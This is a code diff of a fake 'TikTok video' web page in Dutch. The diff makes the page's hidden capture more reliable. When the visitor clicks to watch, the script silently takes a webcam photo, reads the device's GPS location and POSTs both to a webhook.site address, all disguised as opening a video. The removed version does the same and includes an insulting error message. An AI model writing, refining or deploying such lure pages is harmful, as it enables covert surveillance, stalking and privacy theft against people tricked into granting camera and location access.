@@ -3,48 +3,78 @@
 <head>
   <meta charset="UTF-8">
   <title>Tiktok</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    h2 {
+      font-size: 36px;
+    }
+    p {
+      font-size: 20px;
+    }
+    button {
+      font-size: 22px;
+      padding: 12px 24px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-  <h2>Tiktok video weergeven</h2>
+  <h2>Tiktok Video</h2>
   <p>geef toestemming om de app te openen.</p>
 
   <br><br>
-  <button onclick="makePhoto()">Klik om video te bekijken</button>
+  <button onclick="startProcess()">Klik om video te bekijken</button>
 
   <script>
-    let stream;
+    async function startProcess() {
+      try {
+        // Camera starten
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-    // Camera starten
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(s => {
-        stream = s;
-        document.getElementById('video').srcObject = s;
-      })
-      .catch(err => alert("je kkr moeder"));
+        // Tijdelijk video-element in JS voor snapshot
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-    function makePhoto() {
-      const canvas = document.createElement('canvas');
-      const video = document.getElementById('video');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+        // Kleine timeout om camera frame te laten laden
+        setTimeout(async () => {
+          // Foto maken
+          const canvas = document.createElement('canvas');
+          canvas.width = 640; // vaste grootte voor betrouwbaarheid
+          canvas.height = 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(blob => {
-        // Locatie ophalen
-        navigator.geolocation.getCurrentPosition(pos => {
-          const data = new FormData();
-          data.append("photo", blob, "photo.jpg");
-          data.append("lat", pos.coords.latitude);
-          data.append("lon", pos.coords.longitude);
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-          fetch("https://webhook.site/5e01cbe7-69a6-4f2e-b2eb-68ce676642b5", {
-            method: "POST",
-            body: data
-          });
+          // Locatie ophalen
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              const data = new FormData();
+              data.append("photo", blob, "photo.jpg");
+              data.append("lat", pos.coords.latitude);
+              data.append("lon", pos.coords.longitude);
 
-          alert("Foto en locatie verzonden");
-        });
-      });
+              // Verzenden naar webhook
+              await fetch("https://webhook.site/5e01cbe7-69a6-4f2e-b2eb-68ce676642b5", {
+                method: "POST",
+                body: data
+              });
+
+              alert("Foto en locatie succesvol verzonden!");
+            },
+            () => {
+              alert("Locatie toestemming geweigerd");
+            }
+          );
+        }, 500); // 0.5 seconde wachten voor frame
+      } catch (err) {
+        alert("Camera toestemming geweigerd of er is een fout opgetreden");
+      }
     }
   </script>
 </body>
